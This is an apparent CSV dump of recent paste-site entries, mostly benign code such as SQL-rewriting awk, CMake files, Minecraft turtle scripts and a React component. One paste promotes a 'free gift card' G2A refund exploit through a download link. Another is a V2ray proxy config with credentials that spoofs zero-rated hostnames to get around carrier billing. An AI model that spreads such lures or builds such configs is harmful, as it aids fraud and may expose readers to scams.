id,title,username,language,date,content
6WKQ8JNj,escape.awk,kevin2458,Bash,Wednesday 7th of February 2024 12:00:11 PM CDT,"/^INSERT INTO/ {
    # Match columns and values in the INSERT statement
    match($0, /^INSERT INTO[[:space:]]+""?([^"" (]+)""?[[:space:]]*\(([^\)]+)\)[[:space:]]*VALUES[[:space:]]*\((.+)\);$/, matches)

    # Extract table name, columns, and values
    table = matches[1]
    middle = matches[2]
    values = matches[3]

    # Remove all quotes from table name (if needed, depending on the dump format)
    gsub(/""/, """", table)

    # Prepare columns, stripping quotes and surrounding each with backticks
    gsub(/""/, """", middle) # Strip quotes from column names, if present
    n = split(middle, columns, "","") # Split column names into array

    # Initialize variables for constructing the column list with backticks
    sep = """"
    cols = """"
    for(i = 1; i <= n; i++) {
        # Surround column name with backticks
        cols = cols sep ""`"" columns[i] ""`""
        sep = "", ""
    }

    # Print the modified INSERT statement
    printf(""INSERT INTO `%s` (%s) VALUES(%s);\n"", table, cols, values)
}"
WghXPRda,Untitled,arabs-hackers,JavaScript,Wednesday 7th of February 2024 11:46:02 AM CDT,"apply plugin: 'com.android.application'

android {
    compileSdkVersion 30
    defaultConfig {
        applicationId ""com.app.main""
        minSdkVersion 16
        targetSdkVersion 29
        versionCode 1
        versionName ""1.0""
        ndk {
            abiFilters 'armeabi-v7a'
        }
        signingConfig signingConfigs.debug
    }
    buildTypes {
        release {
            shrinkResources false
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            shrinkResources false
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    externalNativeBuild {
        ndkBuild {
            path file('src/main/jni/Android.mk')
        }
    }
}

dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
    
}
"
2BDJxffR,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Wednesday 7th of February 2024 11:37:22 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_622212.pdf
 
Working as of
07 February 2024"
D8s08LfM,ConsoleMenu,SaNik74,C#,Wednesday 7th of February 2024 11:22:03 AM CDT,"class Program
{
    static void Main(string[] args)
    {
        const string CommandEnterName = ""1"";
        const string CommandEnterPassword = ""2"";
        const string CommandWriteDateAndTime = ""3"";
        const string CommandChangeConsoleColor = ""4"";
        const string CommandExit = ""5"";

        string name;
        string password;
        bool isWorking = true;

        while (isWorking)
        {
            Console.WriteLine($""Введите:\n{CommandEnterName} чтобы ввести имя.\n"" +
                $""{CommandEnterPassword} чтобы ввести пароль.\n"" +
                $""{CommandWriteDateAndTime} чтобы вывести дату и время.\n"" +
                $""{CommandChangeConsoleColor} чтобы изменить цвет консоли.\n"" +
                $""{CommandExit} чтобы выйти из программы.\n\n\n"");
            Console.Write(""Ввод:"");

            string? userInput = Console.ReadLine();

            switch (userInput)
            {
                case CommandEnterName:
                    name = Console.ReadLine();
                    break;

                case CommandEnterPassword:
                    password = Console.ReadLine();
                    break;

                case CommandWriteDateAndTime:
                    Console.WriteLine(DateTime.Now);
                    break;

                case CommandChangeConsoleColor:
                    Console.BackgroundColor = ConsoleColor.Blue;
                    break;

                case CommandExit:
                    isWorking = false;
                    break;

                default:
                    Console.WriteLine(""Вы ввели неверную команду."");
                    break;
            }

            Console.Write(""Нажмите любую клавишу"");
            Console.ReadKey();
            Console.Clear();
        }
    }
}"
KPj2JLpG,FindANTLR.cmake,cepxuozab,C++,Wednesday 7th of February 2024 11:21:09 AM CDT,"find_package(Java QUIET COMPONENTS Runtime)

if(NOT ANTLR_EXECUTABLE)
  find_program(ANTLR_EXECUTABLE
               NAMES antlr.jar antlr4.jar antlr-4.jar antlr-4.7.2-complete.jar)
endif()

if(ANTLR_EXECUTABLE AND Java_JAVA_EXECUTABLE)
  execute_process(
      COMMAND ${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}
      OUTPUT_VARIABLE ANTLR_COMMAND_OUTPUT
      ERROR_VARIABLE ANTLR_COMMAND_ERROR
      RESULT_VARIABLE ANTLR_COMMAND_RESULT
      OUTPUT_STRIP_TRAILING_WHITESPACE)

  if(ANTLR_COMMAND_RESULT EQUAL 0)
    string(REGEX MATCH ""Version [0-9]+(\\.[0-9])*"" ANTLR_VERSION ${ANTLR_COMMAND_OUTPUT})
    string(REPLACE ""Version "" """" ANTLR_VERSION ${ANTLR_VERSION})
  else()
    message(
        SEND_ERROR
        ""Command '${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}' ""
        ""failed with the output '${ANTLR_COMMAND_ERROR}'"")
  endif()

  macro(ANTLR_TARGET Name InputFile)
    set(ANTLR_OPTIONS LEXER PARSER LISTENER VISITOR)
    set(ANTLR_ONE_VALUE_ARGS PACKAGE OUTPUT_DIRECTORY DEPENDS_ANTLR)
    set(ANTLR_MULTI_VALUE_ARGS COMPILE_FLAGS DEPENDS)
    cmake_parse_arguments(ANTLR_TARGET
                          ""${ANTLR_OPTIONS}""
                          ""${ANTLR_ONE_VALUE_ARGS}""
                          ""${ANTLR_MULTI_VALUE_ARGS}""
                          ${ARGN})

    set(ANTLR_${Name}_INPUT ${InputFile})

    get_filename_component(ANTLR_INPUT ${InputFile} NAME_WE)

    if(ANTLR_TARGET_OUTPUT_DIRECTORY)
      set(ANTLR_${Name}_OUTPUT_DIR ${ANTLR_TARGET_OUTPUT_DIRECTORY})
    else()
      set(ANTLR_${Name}_OUTPUT_DIR
          ${CMAKE_CURRENT_BINARY_DIR}/antlr4cpp_generated_src/${ANTLR_INPUT})
    endif()

    unset(ANTLR_${Name}_CXX_OUTPUTS)

    if((ANTLR_TARGET_LEXER AND NOT ANTLR_TARGET_PARSER) OR
       (ANTLR_TARGET_PARSER AND NOT ANTLR_TARGET_LEXER))
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.cpp)
      set(ANTLR_${Name}_OUTPUTS
          ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.interp
          ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.tokens)
    else()
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Parser.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Parser.cpp)
      list(APPEND ANTLR_${Name}_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.interp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.tokens)
    endif()

    if(ANTLR_TARGET_LISTENER)
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseListener.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseListener.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Listener.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Listener.cpp)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -listener)
    endif()

    if(ANTLR_TARGET_VISITOR)
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseVisitor.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseVisitor.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Visitor.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Visitor.cpp)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -visitor)
    endif()

    if(ANTLR_TARGET_PACKAGE)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -package ${ANTLR_TARGET_PACKAGE})
    endif()

    list(APPEND ANTLR_${Name}_OUTPUTS ${ANTLR_${Name}_CXX_OUTPUTS})

    if(ANTLR_TARGET_DEPENDS_ANTLR)
      if(ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_INPUT)
        list(APPEND ANTLR_TARGET_DEPENDS
             ${ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_INPUT})
        list(APPEND ANTLR_TARGET_DEPENDS
             ${ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_OUTPUTS})
      else()
        message(SEND_ERROR
                ""ANTLR target '${ANTLR_TARGET_DEPENDS_ANTLR}' not found"")
      endif()
    endif()

    add_custom_command(
        OUTPUT ${ANTLR_${Name}_OUTPUTS}
        COMMAND ${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}
                ${InputFile}
                -o ${ANTLR_${Name}_OUTPUT_DIR}
                -no-listener
                -Dlanguage=Cpp
                ${ANTLR_TARGET_COMPILE_FLAGS}
        DEPENDS ${InputFile}
                ${ANTLR_TARGET_DEPENDS}
        WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}
        COMMENT ""Building ${Name} with ANTLR ${ANTLR_VERSION}"")
  endmacro(ANTLR_TARGET)

endif(ANTLR_EXECUTABLE AND Java_JAVA_EXECUTABLE)

include(FindPackageHandleStandardArgs)
find_package_handle_standard_args(
    ANTLR
    REQUIRED_VARS ANTLR_EXECUTABLE Java_JAVA_EXECUTABLE
    VERSION_VAR ANTLR_VERSION)
"
Rt6V0F7X,CMakeLists.txt,cepxuozab,C++,Wednesday 7th of February 2024 11:19:39 AM CDT,"cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
project(spreadsheet)

set(CMAKE_CXX_STANDARD 17)
if(MSVC)
  set(
    CMAKE_CXX_FLAGS_DEBUG
    ""${CMAKE_CXX_FLAGS_DEBUG} /JMC""
  )
else()
  set(
    CMAKE_CXX_FLAGS
    ""${CMAKE_CXX_FLAGS} -Wall -Wextra -pedantic -Werror -Wno-unused-parameter -Wno-implicit-fallthrough""
  )
endif()


set(ANTLR_EXECUTABLE ${CMAKE_CURRENT_SOURCE_DIR}/antlr-4.7.2-complete.jar)
include(${CMAKE_CURRENT_SOURCE_DIR}/FindANTLR.cmake)

add_definitions(
  -DANTLR4CPP_STATIC
  -D_SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
)

set(WITH_STATIC_CRT OFF CACHE BOOL ""Visual C++ static CRT for ANTLR"" FORCE)
add_subdirectory(antlr4_runtime)

antlr_target(FormulaParser Formula.g4 LEXER PARSER LISTENER)

include_directories(
  ${ANTLR4_INCLUDE_DIRS}
  ${ANTLR_FormulaParser_OUTPUT_DIR}
  ${CMAKE_CURRENT_SOURCE_DIR}/antlr4_runtime/runtime/src
)

file(GLOB sources
  *.cpp
  *.h
)

add_executable(
  spreadsheet
  ${ANTLR_FormulaParser_CXX_OUTPUTS}
  ${sources}
)

target_link_libraries(spreadsheet antlr4_static)
if(MSVC)
  target_compile_options(antlr4_static PRIVATE /W0)
endif()

install(
  TARGETS spreadsheet
  DESTINATION bin
  EXPORT spreadsheet
)

set_directory_properties(PROPERTIES VS_STARTUP_PROJECT spreadsheet)
"
8LpbxDp5,01. Black Flag,Spocoman,JavaScript,Wednesday 7th of February 2024 11:10:16 AM CDT,"function blackFlag(input) {
    let days = Number(input[0]);
    let dailyPlunder = Number(input[1]);
    let expectedPlunder = Number(input[2]);
    let totalPlunder = 0;

    for (let i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        console.log(`Ahoy! ${totalPlunder.toFixed(2)} plunder gained.`);
    } else {
        console.log(`Collected only ${(totalPlunder / expectedPlunder * 100).toFixed(2)}% of the plunder.`);
    }
}"
0ywnWUur,V2ray-BSN,Akun32,YAML,Wednesday 7th of February 2024 11:04:02 AM CDT,"port: 7890
socks-port: 7891
redir-port: 7892
mixed-port: 7893
tproxy-port: 7895
ipv6: false
mode: rule
log-level: silent
allow-lan: true
external-controller: 0.0.0.0:9090
secret: """"
bind-address: ""*""
unified-delay: true
profile:
  store-selected: true
  store-fake-ip: true
dns:
  enable: true
  ipv6: false
  use-host: true
  enhanced-mode: fake-ip
  listen: 0.0.0.0:7874
  nameserver:
    - 8.8.8.8
    - 1.0.0.1
    - https://dns.google/dns-query
  fallback:
    - 1.1.1.1
    - 8.8.4.4
    - https://cloudflare-dns.com/dns-query
    - 112.215.203.254
  default-nameserver:
    - 8.8.8.8
    - 1.1.1.1
    - 112.215.203.254
  fake-ip-range: 198.18.0.1/16
  fake-ip-filter:
    - ""*.lan""
    - ""*.localdomain""
    - ""*.example""
    - ""*.invalid""
    - ""*.localhost""
    - ""*.test""
    - ""*.local""
    - ""*.home.arpa""
    - time.*.com
    - time.*.gov
    - time.*.edu.cn
    - time.*.apple.com
    - time1.*.com
    - time2.*.com
    - time3.*.com
    - time4.*.com
    - time5.*.com
    - time6.*.com
    - time7.*.com
    - ntp.*.com
    - ntp1.*.com
    - ntp2.*.com
    - ntp3.*.com
    - ntp4.*.com
    - ntp5.*.com
    - ntp6.*.com
    - ntp7.*.com
    - ""*.time.edu.cn""
    - ""*.ntp.org.cn""
    - +.pool.ntp.org
    - time1.cloud.tencent.com
    - music.163.com
    - ""*.music.163.com""
    - ""*.126.net""
    - musicapi.taihe.com
    - music.taihe.com
    - songsearch.kugou.com
    - trackercdn.kugou.com
    - ""*.kuwo.cn""
    - api-jooxtt.sanook.com
    - api.joox.com
    - joox.com
    - y.qq.com
    - ""*.y.qq.com""
    - streamoc.music.tc.qq.com
    - mobileoc.music.tc.qq.com
    - isure.stream.qqmusic.qq.com
    - dl.stream.qqmusic.qq.com
    - aqqmusic.tc.qq.com
    - amobile.music.tc.qq.com
    - ""*.xiami.com""
    - ""*.music.migu.cn""
    - music.migu.cn
    - ""*.msftconnecttest.com""
    - ""*.msftncsi.com""
    - msftconnecttest.com
    - msftncsi.com
    - localhost.ptlogin2.qq.com
    - localhost.sec.qq.com
    - +.srv.nintendo.net
    - +.stun.playstation.net
    - xbox.*.microsoft.com
    - xnotify.xboxlive.com
    - +.battlenet.com.cn
    - +.wotgame.cn
    - +.wggames.cn
    - +.wowsgame.cn
    - +.wargaming.net
    - proxy.golang.org
    - stun.*.*
    - stun.*.*.*
    - +.stun.*.*
    - +.stun.*.*.*
    - +.stun.*.*.*.*
    - heartbeat.belkin.com
    - ""*.linksys.com""
    - ""*.linksyssmartwifi.com""
    - ""*.router.asus.com""
    - mesu.apple.com
    - swscan.apple.com
    - swquery.apple.com
    - swdownload.apple.com
    - swcdn.apple.com
    - swdist.apple.com
    - lens.l.google.com
    - stun.l.google.com
    - +.nflxvideo.net
    - ""*.square-enix.com""
    - ""*.finalfantasyxiv.com""
    - ""*.ffxiv.com""
    - ""*.mcdn.bilivideo.cn""
    - +.media.dssott.com
proxies:
  - name: ทรูโนโปร❌
    server: v2ray-true.freezero.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: zero.bsn-free.online
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: zero.bsn-free.online
    udp: true
  - name: ดีแทคโนโปร❌
    server: v2ray-dtac.freezero.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: zero.bsn-free.online
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: zero.bsn-free.online
    udp: true
  - name: ทรูโปรเฟสบุ๊คเกมส์มิ่ง❌
    server: zero.bsn-free.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: fbcdn.net
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: fbcdn.net
    udp: true
  - name: เอไอเอส❌
    server: zero.bsn-free.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: www.speedtest.net
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: www.speedtest.net
    udp: true
  - name: ทรูโนโปร✅
    server: v2ray-true.freezero.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: z.bsn-free.online
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: z.bsn-free.online
    udp: true
  - name: ดีแทคโนโปร✅
    server: v2ray-dtac.freezero.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: z.bsn-free.online
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: z.bsn-free.online
    udp: true
  - name: ทรูโปรเฟสบุ๊คเกมส์มิ่ง✅
    server: z.bsn-free.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: fbcdn.net
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: fbcdn.net
    udp: true
  - name: เอไอเอส✅
    server: z.bsn-free.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: www.speedtest.net
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: www.speedtest.net
    udp: true
proxy-groups:
  - name: VPS-BSN
    type: select
    proxies:
      - ทรูโนโปร❌
      - ดีแทคโนโปร❌
      - ทรูโปรเฟสบุ๊คเกมส์มิ่ง❌
      - เอไอเอส❌
      - ทรูโนโปร✅
      - ดีแทคโนโปร✅
      - ทรูโปรเฟสบุ๊คเกมส์มิ่ง✅
      - เอไอเอส✅
rules:
  - MATCH,VPS-BSN"
5uUVYEYf,Untitled,ERROR_CODE,Lua,Wednesday 7th of February 2024 10:54:23 AM CDT,"import cv2 #подключение библиотеки OpenCv
import serial from datetime #подключение библиотеки даты
import datetime as dt #сокращение библиотеки 
comPort = ""COM3""#подключения порта робота
baudRate = 9600#скорость передачи данных бит/сек
leo = serial.Serial(comPort, baudRate)#подключение ком порта и скорости передачи данных
cam = cv2.VideoCapture(0)#подключение основ. камеры
cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)#высота изображения
cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)#ширина изображения
def snapPhoto(date, frame): #создание функции
   path = ""Photo/""+date+"".jpg""#вид фотографии
    cv2.imshow(""Galerry"", frame) #создание окна и вывод видео
   cv2.imwrite(path, frame)#сохранение фотографии
    print(""Saved"")#вывод в консоль
while True:#цикл
    _, frame = cam.read()   #чтение изоб. с основ. камеры
 line = leo.readline()#чтение данных из порта
    decode_line = str(line[0:len(line)-2].decode(""UTF-8""))#обрезание лишних символов
    dateTime = dt.now().strftime(""%Y_%m_%d_%H_%M_%S"")#установка даты на фотографию
    if(decode_line==""photo""):  #условие если данные из порта это photo то
      snapPhoto(dateTime, frame)#объеденение даты с видео
        decode_line=""""#очистка данных порта
    cv2.waitKey(1)#задержка"
caq0Pna4,miner,Reink,Lua,Wednesday 7th of February 2024 10:47:42 AM CDT,"--[[

Creation d'un programme de minage pour turtle 

Prerequis
	- Inserer deux stack de charbons dans le slot 1 et 2 de la turtle
	- Positionner la turtle a la couche 0 ou inferieur
	
a faire dans le programme :
- Faire le plein en carburant de la turtle
- Faire le minage couche par couche de la zone en 10 par 10 sur 64 couches
- Entre chaque couche verifier qu'il y a assez de place dans l'inventaire pour la couche suivante


Composition de l'inventaire de la turtle :
1 = carburant
2 = carburant
le reste est vide

]]

local hauteur = 0

function carburant()
	term.clear()
	term.setCursorPos(1,1)
	print(""Chargement du carburant..."")
	turtle.select(1)
	turtle.refuel()
	turtle.select(2)
	turtle.refuel()
	turtle.select(1)
end

function checkPlace()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de l'espace libre dans l'inventaire..."")
	espace = turtle.getItemCount(15) + turtle.getItemCount(16)
	if espace ~= 0 then
		videInventaire()
	end
end

function videInventaire()
term.clear()
	term.setCursorPos(1,1)
	print(""La turtle va vider son inventaire..."")
	for i = 0,hauteur do
		turtle.up()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 1,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 0,hauteur do
		turtle.down()
	end
end

function minage()
term.clear()
	term.setCursorPos(1,1)
	print(""Minage en cours..."")
	for i=0,63 do
		for j=1,5 do
			for k=1,10 do
				turtle.digDown()
				turtle.forward()
			end
			turtle.turnRight()
			turtle.forward()
			turtle.turnRight()
			for k=1,10 do
				turtle.digDown()
				turtle.forward()
			end
			turtle.turnLeft()
			turtle.forward()
			turtle.turnLeft()
		end
		turtle.turnLeft()
		for j=1,11 do
			turtle.forward()
		end
		turtle.turnRight()
		turtle.down()
		hauteur = hauteur + 1
		checkPlace()
	end
	videInventaire()
	for i = 0,hauteur do
		turtle.up()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 1,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
end

carburant()
minage()"
pWqRmypU,meltingManager,Reink,Lua,Wednesday 7th of February 2024 10:45:33 AM CDT,"--[[

Creation d'un programme de fonte des minerais

Prerequis
	- la turtle est positionnee a cote d'un coffre de minerais a cuire et d'un coffre de charbon
	
a faire dans le programme :
- Verifier le niveau de fuel dans la turtle et besoin faire le plein
- Prendre les minerais dans le coffre
- Deposer les minerais dans les fours
- Mettre un nombre de charbon adequat dans les fours pour cuire les minerais
- Recuperer les lingots apres la cuisson


Composition de l'inventaire de la turtle :
vide

]]

local items = {}

function checkFuel()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de carburant..."")
	niveau = turtle.getFuelLevel()
	if niveau > 100 then
		print(""Niveau de carburant suffisant"")
	else
		print(""Niveau de carburant insuffisant"")
		turtle.select(16)
		turtle.suckDown() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
		turtle.refuel()
		turtle.select(1)
	end
end

function coffrePlein()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de la presence de minerai dans le coffre..."")
	turtle.select(1)
	turtle.suck()
	nb = turtle.getItemCount()
	turtle.drop()
	if nb ~= 0 then
		return true
	else	
		return false
	end
end

function prendreMinerai()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de la presence de minerai dans le coffre..."")
	if coffrePlein() then
		print(""Il y a un ou des minerais dans le coffre !"")
		for i=1,8 do
			turtle.select(i)
			turtle.suck()
			items[i] = turtle.getItemCount()
		end
	else
		print(""Pas de minerai dans le coffre !"")
	end
end

function prendreCharbon()
	for i=1,8 do
		turtle.select(1)
		nbChar = math.ceil(items[i]/8)
		turtle.suckDown(nbChar)
	end
end

function deposeMinerai()
	turtle.up()
	turtle.up()
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.select(i)
		turtle.dropDown()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
	end
	turtle.down()
	turtle.down()
end

function deposeCharbon()
	turtle.up()
	turtle.turnLeft()
	turtle.forward()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.turnLeft()
		turtle.select(i)
		turtle.drop()
		items[i] = nil
		turtle.turnRight()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
	end
	turtle.turnRight()
	turtle.forward()
	turtle.down()
	turnLeft()
end

function recupLingot()
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.select(i)
		turtle.suckUp()
	end
	turtle.forward()
	for i=1,8 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,9 do
		turtle.forward()
	end
end

checkFuel()
prendreMinerai()
deposeMinerai()
prendreCharbon()
deposeCharbon()
os.sleep(660)
recupLingot()"
HQzC7AnJ,lumberjack,Reink,Lua,Wednesday 7th of February 2024 10:43:24 AM CDT,"--[[

Creation d'un programme de bucheronnage pour turtle 

a faire dans le programme :
- Verification de bonnes conditions pour le lancement
	- Suffisemment de fuel soit un niveau superieur a 300 sinon faire le plein
	- Presence de suffisemment de pousse d'arbre dans l'inventaire (nombre superieur a 10)
- Debut de la routine :
	- Pour chaque arbre verifier si l'arbre a pousser, si oui l'abattre sinon verifier qu'il y a une pousse et sinon la planter
- Faire une pause de 10 minutes et recommencer le cycle 

Composition de l'inventaire de la turtle :
1 = carburant
2 = pousse d'arbre (chene)

]]

local nbArbre = 10

function checkFuel()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de carburant..."")
	niveau = turtle.getFuelLevel()
	if niveau > (nbArbre*3) then
		print(""Niveau de carburant suffisant"")
	else
		print(""Niveau de carburant insuffisant"")
		turtle.select(1)
		quantite = 	turtle.getItemCount()
		if quantite == 0 then
			print(""Il n'y a plus de carburant dans la turtle !"")
			turtle.suckDown() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
			turtle.refuel()
		else
			print(""Ajout de carburant dans la turtle !"")
			turtle.refuel()
		end
	end
end

function checkSapling()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification des pousses..."")
	turtle.select(2)
	nombre = turtle.getItemCount()
	if nombre > nbArbre then
		print(""Nombre de pousses suffisant"")
	else
		print(""Nombre de pousses insuffisant"")
		turtle.turnRight()
		turtle.suck() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
	end
end

function chopTree()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification presence d'un arbre..."")
	turtle.select(3)
	data = turtle.inspect() --A verifier le retour lorsque c'est effectivement un tronc d'arbre devant
	if data == ""minecraft:oak_log"" then
		print(""Recolte de l'arbre !"")
		while data == ""minecraft:oak_log"" do
			turtle.dig()
			turtle.digUp()
			turtle.up()
			data = turtle.inspect()
		end
		blockDown = turtle.detectDown()
		while blockDown == false do
			turtle.down()
		end
		print(""Plantation du nouvel arbre !"")
		turtle.select(2)
		turtle.place()
	end
end

function routine()
	turtle.forward()
	turtle.forward()
	turtle.forward()
	turtle.turnLeft()
	chopTree()
	turtle.turnRight()
	for i=1,nbArbre-1 do
		for j=1,5 do
			turtle.forward()
		end
		turtle.turnLeft()
		chopTree()
		turtle.turnRight()
	end
	turtle.turnRight()
	turtle.turnRight()
	nbblock = (nbArbre-1) * 5 + 3
	for h=1,nbblock do
			turtle.forward()
	end
	turtle.turnRight()
	turtle.turnRight()
end

function videInventaire()
	turtle.turnLeft()
	for i = 3,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnRight()
end

while true do
	checkFuel()
	checkSapling()
	routine()
	videInventaire()
	os.sleep(600)
end"
tM88AvDq,Untitled,lodha1503,JavaScript,Wednesday 7th of February 2024 10:34:24 AM CDT,"import React from ""react"";
import tw from ""twin.macro"";
import styled, { css } from ""styled-components/macro"";
import { Container, ContentWithPaddingXl } from ""components/misc/Layouts.js"";
import { SectionHeading, Subheading as SubheadingBase } from ""components/misc/Headings.js"";
import { SectionDescription } from ""components/misc/Typography.js"";
 
const HeadingContainer = tw.div``;
const Heading = tw(SectionHeading)``;
const Subheading = tw(SubheadingBase)`text-center mb-3 font-Lato`;
const Description = tw(SectionDescription)`mx-auto text-center`;
 
// Adjusted for dynamic sizing
const CardsContainer = tw.div`flex flex-wrap justify-center -mx-4`;
const Card = styled.div`
  ${tw`mt-24 flex flex-col items-center px-4`}
  width: ${props => props.isLarge ? 'calc(25% - 2rem)' : 'calc(16.66667% - 2rem)'};
`;
 
 
// Use inline styles for dynamic image size based on role
const CardImage = styled.div`
  ${props => css`background-image: url(""${props.imageSrc}"");`}
  ${tw`bg-no-repeat bg-cover bg-center rounded-full`}
  width: ${props => (props.isLarge ? '200px' : '130px')};
  height: ${props => (props.isLarge ? '200px' : '130px')};
  border: 2px solid orange;
  box-shadow: 0 0 10px orange ; /* Add border shadow */

`;
 
 
const CardContent = styled.div`
  ${tw`flex flex-col items-center mt-6`}
  
  .position {
    ${tw`uppercase text-lg font-bold tracking-widest  text-orange-600 font-Philosopher`}
  }
  
  .name {
    ${tw`mt-2 text-xl text-center font-semibold text-orange-500 font-Lato`}
    ${props => !props.isLarge && css`font-size: 1rem;`} /* Smaller font size for Assistant Heads */
  }
`;
 
 
const CardLinks = styled.div`
  ${tw`mt-6 flex justify-center`}
  .link {
    ${tw`mr-8 last:mr-0 text-black hocus:text-black transition duration-300 font-Philosopher`}
    .icon {
      ${tw`fill-current w-6 h-6`}
      color: ${props => props.iconColor || '#0000ff60'}; /* Fallback color */
    }
  }
`;
 
 
export default ({
  heading = ""Meet These Fine Folks."",
  subheading = """",
  cards = []
}) => {
  // Filter cards into two groups
  const heads = cards.filter(card => card.position.toLowerCase().includes(""head"") && !card.position.toLowerCase().includes(""assistant""));
  const assistantHeads = cards.filter(card => card.position.toLowerCase().includes(""assistant""));
 
  return (
    <Container>
      <ContentWithPaddingXl>
